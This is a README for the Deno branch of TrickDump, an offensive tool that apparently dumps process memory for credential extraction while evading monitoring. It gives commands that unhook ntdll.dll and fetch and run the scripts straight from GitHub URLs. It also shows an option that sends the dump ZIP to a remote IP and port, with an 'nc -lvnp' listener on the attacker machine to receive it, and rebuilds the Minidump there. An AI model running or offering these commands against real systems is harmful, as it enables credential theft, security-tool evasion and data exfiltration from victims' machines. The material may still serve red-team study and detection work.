# TrickDump - Deno branch

This branch implements the same functionality as the main branch but using Deno (JavaScript, zero dependencies). It uses Deno's FFI to call NT API functions directly.

You can run the files as scripts:

```
deno run --allow-ffi --allow-write lock.js [-o OPTION] [-p PATH]
```

```
deno run --allow-ffi --allow-write shock.js [-o OPTION] [-p PATH]
```

```
deno run --allow-ffi --allow-write barrel.js [-o OPTION] [-p PATH]
```

![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/trickdump/Screenshot_deno_1.png)

You can use the *-o* parameter for overwriting the ntdll.dll library:
- "disk": Using a DLL already on disk. If *-p* parameter is not used the path is "C:\Windows\System32\ntdll.dll".
- "knowndlls": Using the KnownDlls folder.
- "debugproc": Using a process created in debug mode. If *-p* parameter is not used the process is "c:\windows\system32\calc.exe".


You can also run the scripts directly from the repo without cloning:

```
deno run --allow-ffi --allow-write https://raw.githubusercontent.com/ricardojoserf/TrickDump/deno-flavour/lock.js
```
```
deno run --allow-ffi --allow-write https://raw.githubusercontent.com/ricardojoserf/TrickDump/deno-flavour/shock.js
```
```
deno run --allow-ffi --allow-write https://raw.githubusercontent.com/ricardojoserf/TrickDump/deno-flavour/barrel.js
```

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/trickdump/Screenshot_deno_2.png)


Then use the *create_dump.py* script to generate the Minidump file in the attack system:

```
python3 create_dump.py [-l LOCK_JSON] [-s SHOCK_JSON] [-b BARREL_JSON] [-z BARREL_ZIP] [-o OUTPUT_FILE]
```

-------------------------

## All in one

If you prefer to execute only one script, trick.js generates a ZIP file containing the 3 JSON files and the ZIP file with the memory regions:

```
deno run --allow-ffi --allow-write --allow-net trick.js [-o OPTION] [-p PATH] [-i IP] [-P PORT]
```

Or run it directly from the repo:

```
deno run --allow-ffi --allow-write --allow-net https://raw.githubusercontent.com/ricardojoserf/TrickDump/deno-flavour/trick.js
```

You can send the ZIP file to a remote machine instead of writing to disk using the *-i* and *-P* parameters:

```
deno run --allow-ffi --allow-net trick.js -i 192.168.1.100 -P 1234
```

Receive it on the attacker machine:

```
nc -lvnp 1234 > trick.zip
```

You get a ZIP file (trick.zip), and you can create the Minidump file with the *create_dump.py* script using the *-t* flag:

```
python3 create_dump.py -t trick.zip
```

![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/trickdump/Screenshot_deno_4.png)


----------------

## NativeDump

For an alternative approach that creates a Minidump file directly, check out [NativeDump](https://github.com/ricardojoserf/NativeDump/tree/deno-flavour).
